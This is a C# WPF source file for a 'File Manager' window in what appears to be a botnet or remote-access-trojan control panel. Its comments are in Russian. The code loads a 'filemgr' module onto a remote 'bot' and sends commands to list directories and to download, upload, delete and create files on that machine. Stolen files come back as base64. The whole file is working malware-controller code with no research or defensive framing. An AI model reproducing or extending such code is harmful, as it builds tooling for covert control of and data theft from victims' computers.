// Panel/FileManagerWindow.xaml.cs — исправленная версия (без ошибки CS4008 и с сохранением выделения)
using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace SafeOps.Panel
{
    public class FileItem
    {
        [JsonPropertyName("name")]
        public string Name { get; set; } = "";

        [JsonPropertyName("size")]
        public long Size { get; set; }

        [JsonPropertyName("modified")]
        public string Modified { get; set; } = "";

        [JsonPropertyName("type")]
        public string Type { get; set; } = "";

        public bool IsDirectory => Type == "dir";
    }

    public class DirResponse
    {
        [JsonPropertyName("cmd")]
        public string Cmd { get; set; } = "";

        [JsonPropertyName("result")]
        public FileItem[] Result { get; set; } = Array.Empty<FileItem>();
    }

    public partial class FileManagerWindow : Window
    {
        private readonly MainWindow _mainWindow;
        private readonly BotInfo _bot;
        private string _currentPath = "";
        private ObservableCollection<FileItem> _files = new();
        private bool _moduleLoaded = false;

        public FileManagerWindow(MainWindow mainWindow, BotInfo bot)
        {
            InitializeComponent();
            _mainWindow = mainWindow;
            _bot = bot;
            Title = $"File Manager - {bot.Hostname}";
            FilesGrid.ItemsSource = _files;
            _mainWindow.ResponseReceived += OnResponseReceived;
            Closed += (s, e) => _mainWindow.ResponseReceived -= OnResponseReceived;

            _ = LoadModuleAndInit();
        }

        private async Task LoadModuleAndInit()
        {
            await _mainWindow.SendCommandAsync("LOAD_MODULE filemgr", _bot);
            await Task.Delay(1000);
            _moduleLoaded = true;
            LoadDrives();
        }

        private void LoadDrives()
        {
            var drives = DriveInfo.GetDrives();
            Dispatcher.Invoke(() =>
            {
                DirectoryTreeView.Items.Clear();
                foreach (var drive in drives)
                {
                    var item = new TreeViewItem { Header = drive.Name, Tag = drive.Name };
                    DirectoryTreeView.Items.Add(item);
                }
            });
        }

        private async void TreeView_SelectedItemChanged(object sender, RoutedPropertyChangedEventArgs<object> e)
        {
            if (!_moduleLoaded) return;
            if (DirectoryTreeView.SelectedItem is TreeViewItem selected && selected.Tag is string path)
            {
                await LoadDirectory(path);
            }
        }

        private async Task LoadDirectory(string path)
        {
            if (!path.EndsWith("\\")) path += "\\";
            _currentPath = path;
            CurrentPathTextBox.Text = path;
            await _mainWindow.SendCommandAsync($"filemgr:dir {path}", _bot);
        }

        private void OnResponseReceived(object? sender, ResponseEventArgs e)
        {
            if (e.Hostname != _bot.Hostname) return;
            string msg = e.Message.Trim();
            Debug.WriteLine($"[FileManager] Raw: {msg}");

            string jsonPart = msg;
            if (msg.StartsWith("filemgr:dir"))
                jsonPart = msg.Substring("filemgr:dir".Length).Trim();

            if (jsonPart.StartsWith("{") && jsonPart.EndsWith("}"))
            {
                try
                {
                    var response = JsonSerializer.Deserialize<DirResponse>(jsonPart);
                    if (response != null && response.Cmd == "dir" && response.Result != null)
                    {
                        string? selectedName = (FilesGrid.SelectedItem as FileItem)?.Name;

                        Dispatcher.Invoke(() =>
                        {
                            _files.Clear();
                            foreach (var item in response.Result)
                            {
                                if (item.Name != "." && item.Name != "..")
                                    _files.Add(item);
                            }

                            if (!string.IsNullOrEmpty(selectedName))
                            {
                                var toSelect = _files.FirstOrDefault(f => f.Name == selectedName);
                                if (toSelect != null)
                                    FilesGrid.SelectedItem = toSelect;
                            }
                        });
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[FileManager] JSON error: {ex.Message}");
                }
            }

            // Обработка других команд
            if (msg.StartsWith("filemgr:get"))
            {
                string base64 = msg.Substring("filemgr:get".Length).Trim();
                if (string.IsNullOrEmpty(base64)) return;
                try
                {
                    byte[] data = Convert.FromBase64String(base64);
                    var dialog = new Microsoft.Win32.SaveFileDialog();
                    if (dialog.ShowDialog() == true)
                    {
                        File.WriteAllBytes(dialog.FileName, data);
                        MessageBox.Show("Файл сохранён.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Ошибка получения файла: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            else if (msg.StartsWith("filemgr:put") || msg.StartsWith("filemgr:del") || msg.StartsWith("filemgr:mkdir"))
            {
                _ = LoadDirectory(_currentPath);
            }
        }

        private async void RefreshButton_Click(object sender, RoutedEventArgs e) => await LoadDirectory(_currentPath);

        private async void FilesGrid_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (FilesGrid.SelectedItem is FileItem item && item.IsDirectory)
            {
                string newPath = System.IO.Path.Combine(_currentPath, item.Name);
                if (!newPath.EndsWith("\\")) newPath += "\\";
                await LoadDirectory(newPath);
            }
            else if (FilesGrid.SelectedItem is FileItem fileItem && !fileItem.IsDirectory)
            {
                await DownloadFile(fileItem);
            }
        }

        private async Task DownloadFile(FileItem item)
        {
            string remotePath = System.IO.Path.Combine(_currentPath, item.Name);
            await _mainWindow.SendCommandAsync($"filemgr:get {remotePath}", _bot);
        }

        private async void DownloadButton_Click(object sender, RoutedEventArgs e)
        {
            if (FilesGrid.SelectedItem is FileItem item && !item.IsDirectory)
            {
                await DownloadFile(item);
            }
            else
                MessageBox.Show("Выберите файл.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private async void UploadButton_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new Microsoft.Win32.OpenFileDialog();
            if (dialog.ShowDialog() == true)
            {
                byte[] data = File.ReadAllBytes(dialog.FileName);
                string base64 = Convert.ToBase64String(data);
                string fileName = System.IO.Path.GetFileName(dialog.FileName);
                string remotePath = System.IO.Path.Combine(_currentPath, fileName);
                await _mainWindow.SendCommandAsync($"filemgr:put {remotePath} {base64}", _bot);
            }
        }

        private async void DeleteButton_Click(object sender, RoutedEventArgs e)
        {
            if (FilesGrid.SelectedItem is FileItem item)
            {
                string remotePath = System.IO.Path.Combine(_currentPath, item.Name);
                if (MessageBox.Show($"Удалить {item.Name}?", "Подтверждение", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes)
                {
                    await _mainWindow.SendCommandAsync($"filemgr:del {remotePath}", _bot);
                }
            }
        }

        private async void NewFolderButton_Click(object sender, RoutedEventArgs e)
        {
            string folderName = Microsoft.VisualBasic.Interaction.InputBox("Имя новой папки:", "Создать папку", "NewFolder");
            if (!string.IsNullOrWhiteSpace(folderName))
            {
                string remotePath = System.IO.Path.Combine(_currentPath, folderName);
                await _mainWindow.SendCommandAsync($"filemgr:mkdir {remotePath}", _bot);
            }
        }
    }
}